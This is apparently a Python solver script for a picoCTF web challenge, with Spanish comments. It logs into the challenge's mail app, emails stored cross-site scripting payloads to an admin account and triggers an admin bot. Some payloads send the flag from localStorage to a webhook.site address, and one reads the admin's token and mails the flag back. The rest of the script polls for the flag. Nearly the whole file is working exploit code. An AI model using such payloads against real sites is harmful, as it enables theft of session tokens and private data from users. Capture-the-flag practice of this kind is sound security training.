#!/usr/bin/env python3
import requests
import time
import random
import string
import itertools

URL = "http://activist-birds.picoctf.net:63813"

def random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

iteration = 0
while True:
    iteration += 1
    print(f"\n[Iteration {iteration}]")
    
    # Intentar obtener password
    r = requests.get(f"{URL}/api/password")
    if r.status_code == 200:
        pwd = r.text.strip('"')
        if "already" not in pwd:
            print(f"PASSWORD FOUND: {pwd}")
            
            # Login
            r = requests.post(f"{URL}/api/login", json={"username": "user@ses", "password": pwd})
            if r.status_code == 200:
                token = r.json()
                headers = {"Authorization": f"Bearer {token}"}
                
                # Enviar múltiples payloads
                payloads = [
                    f"<img src=x onerror=\"window.location='http://webhook.site/{random_string()}?flag='+localStorage.getItem('flag')\">",
                    f"<script>fetch('/api/send',{{method:'POST',headers:{{'Authorization':localStorage.getItem('token'),'Content-Type':'application/json'}},body:JSON.stringify({{to:'user@ses',subject:'FLAG',body:localStorage.getItem('flag')}})}});</script>",
                    f"<img src=x onerror=\"document.write(localStorage.getItem('flag'))\">",
                    f"{{{{localStorage.getItem('flag')}}}}",
                    f"${{localStorage.getItem('flag')}}",
                    f"<svg onload=\"alert(localStorage.getItem('flag'))\">",
                ]
                
                for payload in payloads:
                    r = requests.post(f"{URL}/api/send", headers=headers, json={
                        "to": "admin@ses",
                        "subject": f"Test {random_string()}",
                        "body": payload
                    })
                
                # Trigger admin
                r = requests.post(f"{URL}/api/admin_bot", headers=headers)
                
                # Esperar y revisar
                time.sleep(10)
                r = requests.get(f"{URL}/api/emails", headers=headers)
                if r.status_code == 200:
                    emails = r.json()
                    for email_id, email_data in emails.items():
                        if isinstance(email_data, dict) and email_data.get('from') == 'admin@ses':
                            r2 = requests.get(f"{URL}/api/email/{email_id}", headers=headers)
                            content = str(r2.json())
                            if 'picoCTF' in content:
                                print(f"\n[!!!] FLAG FOUND: {content}")
                                import re
                                flags = re.findall(r'picoCTF\{[^}]+\}', content)
                                for flag in flags:
                                    print(f"FLAG: {flag}")
                                exit(0)
    
    # Intentar otros métodos
    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']
    for method in methods:
        try:
            r = requests.request(method, f"{URL}/api/flag")
            if 'picoCTF' in r.text:
                print(f"FLAG via {method}: {r.text}")
                exit(0)
        except:
            pass
    
    time.sleep(1)